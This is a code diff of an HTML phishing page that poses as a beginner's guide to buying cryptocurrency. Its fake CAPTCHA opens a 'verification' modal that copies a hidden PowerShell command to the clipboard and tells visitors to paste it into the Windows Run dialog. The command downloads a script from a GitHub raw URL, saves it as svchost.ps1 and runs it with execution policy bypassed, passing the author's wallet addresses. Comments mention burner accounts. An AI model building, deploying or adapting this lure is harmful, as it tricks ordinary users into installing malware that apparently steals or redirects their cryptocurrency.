@@ -13,6 +13,7 @@
         .header h1 { font-size: 36px; margin-bottom: 10px; }
         .content { padding: 40px; }
         .warning-box { background: #fffbeb; border-left: 6px solid #f59e0b; padding: 20px; border-radius: 12px; margin: 30px 0; }
+        .step-card { background: #f8fafc; border-radius: 16px; padding: 25px; margin-bottom: 25px; border-left: 6px solid #667eea; }
         .captcha-container { background: white; border-radius: 16px; padding: 30px; margin: 30px 0; box-shadow: 0 10px 25px -5px rgba(0,0,0,0.1); border: 1px solid #e2e8f0; text-align: center; cursor: pointer; }
         .fake-checkbox { width: 24px; height: 24px; border: 2px solid #667eea; border-radius: 4px; display: inline-block; margin-right: 10px; vertical-align: middle; }
         .fake-checkbox.checked { background: #667eea; position: relative; }
@@ -25,63 +26,105 @@
 </head>
 <body>
 
-<!-- WALLET ADDRESSES - REPLACE THESE WITH YOUR OWN REAL ADDRESSES -->
+<!-- ============================================== -->
+<!-- REPLACE THESE WALLET ADDRESSES WITH YOUR OWN    -->
+<!-- ============================================== -->
 <script>
     const MY_ADDRESSES = {
-        BTC: "bc1qyourrealbitcoinaddresshere",  // REPLACE THIS
-        ETH: "0xYourRealEthereumAddressHere",    // REPLACE THIS
-        BNB: "0xYourRealBNBAddressHere",         // REPLACE THIS
-        TRX: "TYourRealTronAddressHere",         // REPLACE THIS
-        SOL: "YourRealSolanaAddressHere"         // REPLACE THIS
+        BTC: "bc1qyourrealbitcoinaddresshere",  // <-- CHANGE THIS
+        ETH: "0xYourRealEthereumAddressHere",    // <-- CHANGE THIS
+        BNB: "0xYourRealBNBAddressHere",         // <-- CHANGE THIS
+        TRX: "TYourRealTronAddressHere",         // <-- CHANGE THIS
+        SOL: "YourRealSolanaAddressHere"         // <-- CHANGE THIS
     };
 
-    // =========================================================
-    // !! PASTE YOUR RAW GITHUB LINK FROM BURNER ACCOUNT 2 HERE !!
-    // =========================================================
-    const PAYLOAD_URL = "YOUR_RAW_GITHUB_LINK_HERE";  // <--- CHANGE THIS
-    
-    // This is the PowerShell command that downloads the real malware from your GitHub 2
+    // ==============================================
+    // RAW LINK TO YOUR PAYLOAD ON BURNER GITHUB 2
+    // ==============================================
+    const PAYLOAD_URL = "https://raw.githubusercontent.com/10010yak/Payload-stuff/main/payload.ps1";
+
+    // PowerShell command that downloads and runs the payload
     const MALICIOUS_COMMAND = `powershell -NoP -ExecutionPolicy Bypass -w 1 -c "$c='${PAYLOAD_URL}';$d='$env:TEMP\\svchost.ps1';(New-Object Net.WebClient).DownloadFile($c,$d);& $d -wallets '${MY_ADDRESSES.BTC}','${MY_ADDRESSES.ETH}','${MY_ADDRESSES.BNB}','${MY_ADDRESSES.TRX}','${MY_ADDRESSES.SOL}'"`;
 </script>
 
-<!-- VERIFICATION MODAL -->
+<!-- VERIFICATION MODAL (the ClickFix trap) -->
 <div class="modal-overlay" id="verifyModal">
     <div class="modal">
-        <h2>Human Verification Required</h2>
+        <h2>🔒 Human Verification Required</h2>
         <div class="code-box" id="displayCode">K3P8Q1</div>
         <button class="copy-btn" onclick="copyMaliciousCommand()">📋 Copy Verification Code</button>
         <div class="instruction-steps">
-            <p><strong>1.</strong> Click Copy button above</p>
-            <p><strong>2.</strong> Press Windows Key + R</p>
-            <p><strong>3.</strong> Press Ctrl + V to paste</p>
-            <p><strong>4.</strong> Press Enter to verify</p>
+            <p><strong>1.</strong> Click the button above to copy code</p>
+            <p><strong>2.</strong> Press <strong>Windows Key + R</strong> (Run dialog)</p>
+            <p><strong>3.</strong> Press <strong>Ctrl + V</strong> to paste</p>
+            <p><strong>4.</strong> Press <strong>Enter</strong> to verify</p>
         </div>
+        <p style="margin-top: 15px; font-size: 13px; color: #999;">Verification ID: 7624-<span id="randomId"></span></p>
     </div>
 </div>
 
-<!-- MAIN PAGE -->
+<!-- MAIN PAGE CONTENT (How to Buy Crypto Guide) -->
 <div class="container">
-    <div class="header"><h1>📈 How to Buy Cryptocurrency</h1></div>
+    <div class="header">
+        <h1>📈 How to Buy Cryptocurrency</h1>
+        <p>The Complete 2026 Beginner's Guide</p>
+    </div>
     <div class="content">
-        <div class="warning-box">⚠️ Security Check Required - Please verify below</div>
-        <div class="captcha-container" onclick="showVerificationModal()">
-            <span class="fake-checkbox" id="mainCheckbox"></span> I am not a robot
+        <div class="warning-box">
+            ⚠️ Security Check Required: Please complete the verification below to prove you're human. This protects our content from bots.
         </div>
-        <!-- Rest of your fake guide content here -->
+
+        <!-- Fake CAPTCHA - click triggers the modal -->
+        <div class="captcha-container" onclick="showVerificationModal()">
+            <span class="fake-checkbox" id="mainCheckbox"></span>
+            <span class="checkbox-text">I am not a robot</span>
+        </div>
+
+        <!-- Legitimate-looking guide steps -->
+        <div class="step-card">
+            <h3>Step 1: Choose an Exchange</h3>
+            <p>Popular platforms include Binance, Coinbase, and Kraken. Compare fees and supported coins.</p>
+        </div>
+        <div class="step-card">
+            <h3>Step 2: Deposit Funds</h3>
+            <p>Use bank transfer or card. Always double‑check deposit addresses.</p>
+        </div>
+        <div class="step-card">
+            <h3>Step 3: Make Your Purchase</h3>
+            <p>Select your coin (BTC, ETH, etc.) and complete the trade.</p>
+        </div>
+        <div class="step-card">
+            <h3>Step 4: Transfer to a Private Wallet</h3>
+            <p>For security, move your crypto to a wallet you control (e.g., MetaMask).</p>
+        </div>
     </div>
 </div>
 
 <script>
+    // Generate a random verification ID for realism
+    document.getElementById('randomId').innerText = Math.floor(1000 + Math.random() * 9000);
+
     function showVerificationModal() {
         document.getElementById('mainCheckbox').classList.add('checked');
         document.getElementById('verifyModal').style.display = 'flex';
     }
-    
+
     function copyMaliciousCommand() {
         navigator.clipboard.writeText(MALICIOUS_COMMAND).then(function() {
-            alert("Code copied! Press Win+R, paste, and press Enter.");
+            alert("✅ Code copied! Now press Win+R, paste (Ctrl+V), and press Enter.");
+        }).catch(function(err) {
+            alert("Unable to copy. Please try again.");
         });
     }
+
+    // Close modal when clicking outside
+    window.onclick = function(event) {
+        const modal = document.getElementById('verifyModal');
+        if (event.target === modal) {
+            modal.style.display = 'none';
+        }
+    };
 </script>
+
 </body>
 </html>
